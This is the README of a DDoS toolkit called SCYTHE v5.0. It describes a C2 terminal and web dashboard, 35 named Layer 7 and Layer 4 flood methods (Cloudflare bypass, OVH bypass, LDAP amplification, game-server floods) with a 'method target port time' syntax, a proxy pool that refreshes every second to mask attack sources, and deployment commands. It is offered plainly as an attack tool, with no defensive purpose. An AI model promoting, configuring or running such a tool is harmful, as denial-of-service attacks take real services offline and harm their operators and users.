# SCYTHE DDoS Toolkit v5.0 - Professional C2 & Dashboard

## Features
- **Unified Syntax**: One command pattern for ALL methods
- **Auto-Proxy**: System fetches & refreshes proxies every 1 second from API
- **System Optimized**: Threads, rate, connections auto-adjusted
- **Max Concurrent**: 5 attacks per VPS
- **Max Hold**: 86400 seconds (24 hours) per attack
- **35 Methods**: 18 Layer 7 + 17 Layer 4
- **Synchronized**: Terminal C2 + Web Dashboard share real-time state

## Unified Attack Syntax
```
method  target  port  time
```
Same syntax for ALL methods - no exceptions.

### Layer 7 Examples
```bash
httpbypass  https://target.com    443  60
h2-bypass   https://target.com    443  60
cf-flood    https://target.com    443  60
tls         https://target.com    443  60
slow        https://target.com    443  60
hyper       https://target.com    443  60
httpget     https://target.com    443  60
http-storm  https://target.com    443  60
cfgas       https://target.com    443  60
h2-hold     https://target.com    443  60
https-spoof https://target.com    443  60
auto        https://target.com    443  60
crash       https://target.com    443  60
httpflood   https://target.com    443  60
httpssl     https://target.com    443  60
uambypass   https://target.com    443  60
cf-bypass   https://target.com    443  60
http-requests https://target.com  443  60
```

### Layer 4 Examples
```bash
udp         1.1.1.1    53   60
tcp         1.1.1.1    80   60
std         1.1.1.1    80   60
destroy     1.1.1.1    80   60
home        1.1.1.1    80   60
god         1.1.1.1    80   60
slowloris   1.1.1.1    80   60
flux        1.1.1.1    80   60
stdv2       1.1.1.1    80   60
ovh-raw     1.1.1.1    80   60
ovh-beam    1.1.1.1    80   60
overflow    1.1.1.1    80   60
ovh-amp     1.1.1.1    80   60
minecraft   1.1.1.1    25565 60
samp        1.1.1.1    7777 60
ldap        1.1.1.1    389  60
nfo-killer  1.1.1.1    80   60
udpbypass   1.1.1.1    80   60
```

## C2 Commands
```
help        - Show complete command reference
methods     - Show all 35 methods with descriptions
ongoing     - Show active attacks and system status
layer7      - Show Layer 7 methods only
layer4      - Show Layer 4 methods only
stop <id>   - Stop specific attack by ID
stopall     - Stop all active attacks
getproxy    - Manual proxy refresh from API
clear       - Clear terminal screen
exit        - Exit C2 terminal
```

## Auto-Proxy System
- **Before attack**: System auto-fetches initial proxy pool
- **During attack**: Background thread refreshes proxies every 1 second
- **API sources**: 3 endpoints from proxies.is API (VN, ID, global)
- **Pool growth**: Infinite - proxies accumulate over time
- **Proxy file**: `proxies.txt` (auto-managed, do not edit)

## Quick Deploy
```bash
chmod +x setup.sh && ./setup.sh
python3 c2.py          # Terminal 1
python3 dashboard.py   # Terminal 2
# Access: http://your-vps-ip:1837
```

## Architecture
```
Terminal C2 ◄──► state.json ◄──► Web Dashboard (port 1837)
       │                              │
       ▼                              ▼
   getproxy.py (auto-refresh)    Browser Client
       │
       ▼
   proxies.is API (1s refresh)
```

## Requirements
- Python 3.8+, Node.js 18+, Go 1.19+ (optional)
- Linux VPS (Ubuntu 20.04+ recommended)
- 1GB+ RAM, 1 CPU core minimum

## Credits
- Built for: @scytheinhere88
- C2 Framework: SCYTHE v5.0
